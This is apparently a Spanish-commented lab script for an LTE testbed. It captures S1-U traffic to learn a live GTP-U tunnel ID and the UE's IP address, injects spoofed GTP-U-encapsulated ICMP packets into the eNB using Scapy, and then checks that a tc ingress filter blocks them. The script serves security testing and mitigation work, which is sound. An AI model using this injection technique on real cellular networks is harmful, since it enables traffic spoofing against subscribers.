#!/bin/sh
# ============================================================================
# v6_gtp_cierre.sh - V6: inyeccion GTP-U en S1-U + contramedida.
#
# Fase 1 descubre el TEID DL real capturando en open5gs (eth0:2152).
# Fase 2 inyecta 5 ICMP echo request desde Kali (.99) al eNB (.4:2152)
#         usando el TEID DL y la IP interna de la UE.
# Fase 3 repite con filtro tc en el eNB (solo permite SGW-U .3).
#
# Evidencia: results/v6_d3/v6_{discovery,vuln,mit}_*.pcap + metrics.
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
TS=$(date -u +%Y%m%dT%H%M%SZ)
OUT=results/v6_d3
ABS=$(pwd)/$OUT
mkdir -p "$OUT"
log() { echo "[v6] $*"; }
CAP_ENB="v6enb_$$"
CAP_UPF="v6upf_$$"
cleanup() {
  docker rm -f "$CAP_ENB" "$CAP_UPF" >/dev/null 2>&1 || true
  docker run --rm --net=container:srsenb --cap-add NET_ADMIN kali-lab:latest \
    sh -c 'tc qdisc del dev eth0 clsact >/dev/null 2>&1 || true' >/dev/null 2>&1 || true
}
trap cleanup EXIT

command -v docker >/dev/null || { echo "docker no disponible"; exit 1; }
docker inspect -f '{{.State.Running}}' kali >/dev/null 2>&1 || docker compose up -d kali >/dev/null
for c in srsue srsenb open5gs; do
  test "$(docker inspect -f '{{.State.Running}}' "$c" 2>/dev/null)" = "true" || {
    echo "contenedor $c no esta UP"; exit 1; }
done

# --- 1. Descubrir TEID DL y IP de la UE ---
log "descubriendo TEID DL en S1-U"
docker run -d --name "$CAP_UPF" --net=container:open5gs \
  --cap-add NET_RAW --cap-add NET_ADMIN -v "$ABS:/cap" kali-lab:latest \
  sh -c "timeout 10 tcpdump -i eth0 -s0 -w /cap/v6_discovery_$TS.pcap 'udp port 2152' >/cap/v6_discovery_$TS.log 2>&1" >/dev/null
sleep 1
docker exec srsue sh -c 'ping -I tun_srsue -c 8 -i 1 10.45.0.1' >/dev/null 2>&1 || true
sleep 10
docker rm -f "$CAP_UPF" >/dev/null 2>&1 || true

DISCOVERY=$(docker run --rm -v "$ABS:/cap" kali-lab:latest \
  tshark -r "/cap/v6_discovery_$TS.pcap" \
  -Y 'gtp && ip.src == 172.20.0.3 && ip.dst == 172.20.0.4' \
  -T fields -e gtp.teid -e ip.src -e ip.dst 2>/dev/null | head -n 1)
TEID=$(printf '%s\n' "$DISCOVERY" | awk -F '\t' '{print $1}')
UE_IP=$(printf '%s\n' "$DISCOVERY" | awk -F '\t' '{split($3,b,","); print b[2]}')
[ -n "$TEID" ] && [ -n "$UE_IP" ] || { log "no se pudo descubrir TEID/IP"; exit 1; }
log "TEID=$TEID UE=$UE_IP"

inject() {
  docker exec kali python3 -c "
from scapy.all import IP,UDP,ICMP,Raw,send
from scapy.contrib.gtp import GTP_U_Header
p=IP(src='172.20.0.99',dst='172.20.0.4')/UDP(sport=2152,dport=2152)/GTP_U_Header(teid=$TEID,gtp_type=255)/IP(src='10.45.0.1',dst='$UE_IP')/ICMP(type=8,id=0x1337,seq=7)/Raw(b'V6-INJECT')
send(p,count=5,verbose=0)
" 2>/dev/null || true
}

count_enb() {
  docker run --rm -v "$ABS:/cap" kali-lab:latest tshark -r "/cap/$1" \
    -Y "gtp && $2" -T fields -e frame.number 2>/dev/null | wc -l | tr -d ' '
}
count_upf() {
  docker run --rm -v "$ABS:/cap" kali-lab:latest tshark -r "/cap/$1" \
    -Y "gtp && $2" -T fields -e frame.number 2>/dev/null | wc -l | tr -d ' '
}

# --- 2. V6 vulnerable ---
log "capturando e inyectando V6 vulnerable"
docker run -d --name "$CAP_ENB" --net=container:srsenb \
  --cap-add NET_RAW --cap-add NET_ADMIN -v "$ABS:/cap" kali-lab:latest \
  sh -c "timeout 14 tcpdump -i eth0 -s0 -w /cap/v6_vuln_enb_$TS.pcap 'udp port 2152' >/cap/v6_vuln_enb_$TS.log 2>&1" >/dev/null
docker run -d --name "$CAP_UPF" --net=container:open5gs \
  --cap-add NET_RAW --cap-add NET_ADMIN -v "$ABS:/cap" kali-lab:latest \
  sh -c "timeout 14 tcpdump -i eth0 -s0 -w /cap/v6_vuln_upf_$TS.pcap 'udp port 2152' >/cap/v6_vuln_upf_$TS.log 2>&1" >/dev/null
sleep 1
inject
sleep 10
docker rm -f "$CAP_ENB" "$CAP_UPF" >/dev/null 2>&1 || true

V_INJ=$(count_enb "v6_vuln_enb_$TS.pcap" "ip.src == 172.20.0.99 && data.data contains \"V6-INJECT\"")
V_RESP=$(count_enb "v6_vuln_enb_$TS.pcap" "icmp.type == 0 && data.data contains \"V6-INJECT\"")
V_UPF=$(count_upf "v6_vuln_upf_$TS.pcap" "icmp.type == 0 && data.data contains \"V6-INJECT\"")
cat > "$OUT/v6_vuln_metrics_$TS.txt" <<EOF
mode=vuln
timestamp=$TS
teid=$TEID
ue_ip=$UE_IP
injected_attempts=5
injected_seen_enb=$V_INJ
responses_enb=$V_RESP
responses_upf=$V_UPF
verdict=$([ "$V_RESP" -ge 1 ] && echo VULNERABLE || echo NO_REPRODUCIDO)
EOF
log "vuln: inyectados=$V_INJ respuestas_enb=$V_RESP respuestas_upf=$V_UPF"

# --- 3. Mitigacion en eNB: solo SGW-U .3 puede entrar a 2152 ---
log "aplicando filtro tc en eNB (solo 172.20.0.3)"
docker run --rm --net=container:srsenb --cap-add NET_ADMIN kali-lab:latest sh -c '
  tc qdisc add dev eth0 clsact 2>/dev/null || true
  tc filter add dev eth0 ingress protocol ip pref 1 flower src_ip 172.20.0.3 ip_proto udp dst_port 2152 action pass
  tc filter add dev eth0 ingress protocol ip pref 2 flower ip_proto udp dst_port 2152 action drop
' >/dev/null 2>&1 || { log "no se pudo aplicar tc"; exit 1; }

docker run -d --name "$CAP_ENB" --net=container:srsenb \
  --cap-add NET_RAW --cap-add NET_ADMIN -v "$ABS:/cap" kali-lab:latest \
  sh -c "timeout 12 tcpdump -i eth0 -s0 -w /cap/v6_mit_enb_$TS.pcap 'udp port 2152' >/cap/v6_mit_enb_$TS.log 2>&1" >/dev/null
docker run -d --name "$CAP_UPF" --net=container:open5gs \
  --cap-add NET_RAW --cap-add NET_ADMIN -v "$ABS:/cap" kali-lab:latest \
  sh -c "timeout 12 tcpdump -i eth0 -s0 -w /cap/v6_mit_upf_$TS.pcap 'udp port 2152' >/cap/v6_mit_upf_$TS.log 2>&1" >/dev/null
sleep 1
inject
sleep 8
docker rm -f "$CAP_ENB" "$CAP_UPF" >/dev/null 2>&1 || true

M_INJ=$(count_enb "v6_mit_enb_$TS.pcap" "ip.src == 172.20.0.99 && data.data contains \"V6-INJECT\"")
M_RESP=$(count_enb "v6_mit_enb_$TS.pcap" "icmp.type == 0 && data.data contains \"V6-INJECT\"")
M_UPF=$(count_upf "v6_mit_upf_$TS.pcap" "icmp.type == 0 && data.data contains \"V6-INJECT\"")
cat > "$OUT/v6_mit_metrics_$TS.txt" <<EOF
mode=mit
timestamp=$TS
teid=$TEID
ue_ip=$UE_IP
injected_attempts=5
injected_seen_enb=$M_INJ
responses_enb=$M_RESP
responses_upf=$M_UPF
filter=tc-flower-src-172.20.0.3-solo
verdict=$([ "$M_RESP" -eq 0 ] && echo MITIGADO || echo FALLO)
EOF
log "mit: inyectados=$M_INJ respuestas_enb=$M_RESP respuestas_upf=$M_UPF"

# Verificar que D2 sigue vivo
docker exec srsue sh -c "grep -a '200 OK' /tmp/baresip.log | tail -n 1" || true
log "evidencia en $OUT"
